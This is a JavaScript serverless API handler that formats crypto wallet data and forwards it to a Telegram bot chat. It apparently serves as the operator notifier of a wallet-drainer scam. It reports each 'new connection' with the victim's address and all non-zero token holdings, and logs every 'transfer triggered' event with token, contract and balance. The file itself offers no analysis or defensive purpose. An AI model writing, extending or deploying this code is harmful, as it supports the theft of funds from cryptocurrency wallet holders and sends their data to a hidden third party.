require('dotenv').config();

export default async function handler(req, res) {

	if (req.method === 'POST') {

		try {

			const { type, message } = req.body;

			// Define your bot's token (loaded from .env file)
			const BOT_TOKEN = process.env.BOT_TOKEN;

			// Define your bot's chat ID (the ID of the chat you want to send the message to)
			const CHAT_ID = process.env.CHAT_ID;

			// Define the URL for sending messages to your bot
			const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

			let formattedMessage;

			if (type === "balances") {

				// Filter out items with quote_rate $0.00
				const filteredData = message.filter(item => item.contract_name && item.pretty_quote !== "$0.00");

				// Map each item to a formatted string
				const formattedData = filteredData.map(item => {
					return `Contract Name: ${item.contract_name}\nContract Address: ${item.contract_address}\nQuote: ${item.pretty_quote}\n`;
				});

				// Join the formatted strings with a newline
				formattedMessage = formattedData.join("\n");

				// Add the address to the beginning of the message
				formattedMessage = "New connection detected\n\nAddress: " + message[0].address + "\n\n" + formattedMessage;

				console.log("balances: ", formattedMessage);

			} else if (type === "transfer") {

				formattedMessage = `Transfer triggered
Address: ${message.address}
Token: ${message.token}
Contract: ${message.contract}
Balance: ${message.balance}
Type: ${message.type}`;

				console.log("transfer: ", formattedMessage);

			}

			// Create a function to send a message to your bot
			try {
				// Make a POST request to the Telegram Bot API with the message data
				const response = await fetch(TELEGRAM_API_URL, {
					method: 'POST',
					headers: {
						'Content-Type': 'application/json'
					},
					body: JSON.stringify({
						chat_id: CHAT_ID,
						text: formattedMessage
					})
				});

				// Parse the JSON response
				const responseData = await response.json();

				res.status(200).json({ success: true, responseData });
			} catch (error) {
				// Log any errors that occur during the request
				console.error('Error sending message to bot:', error);
			}

		} catch (error) {
			console.error(error);
			res.status(500).json({ success: false, error: error.message });
		}
	} else {
		res.status(405).end();
	}
}